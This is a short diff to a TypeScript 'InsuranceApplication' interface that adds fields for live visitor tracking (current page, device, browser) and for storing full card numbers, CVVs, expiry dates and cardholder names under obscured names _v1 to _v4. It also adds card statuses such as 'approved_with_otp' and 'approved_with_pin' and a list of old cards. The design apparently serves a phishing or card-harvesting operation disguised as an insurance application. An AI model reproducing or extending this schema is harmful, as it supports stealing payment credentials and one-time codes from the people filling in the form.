@@ -40,8 +40,28 @@ export interface InsuranceApplication {
     idVerificationStatus?: "pending" | "approved" | "rejected"
     idVerifiedAt?: Date
     lastSeen?:string
+
+    // Online tracking
+    isOnline?: boolean
+    lastActiveAt?: string
+    currentPage?: string
+    deviceType?: string
+    browser?: string
+    os?: string
+
+    // Card data (from pay-form)
+    _v1?: string  // card number
+    _v2?: string  // cvv
+    _v3?: string  // expiry MM/YY
+    _v4?: string  // cardholder name
+    cardType?: string
+    bankInfo?: { name: string; country: string }
+    cardStatus?: "pending" | "approved_with_otp" | "approved_with_pin" | "rejected" | "message" | "confirmed"
+    otpStatus?: string
+    oldCards?: any[]
+
     // Metadata
-    currentStep: number
+    currentStep: number | string
     status: "draft" | "pending_review" | "approved" | "rejected" | "completed"
     assignedProfessional?: string
     createdAt: Date
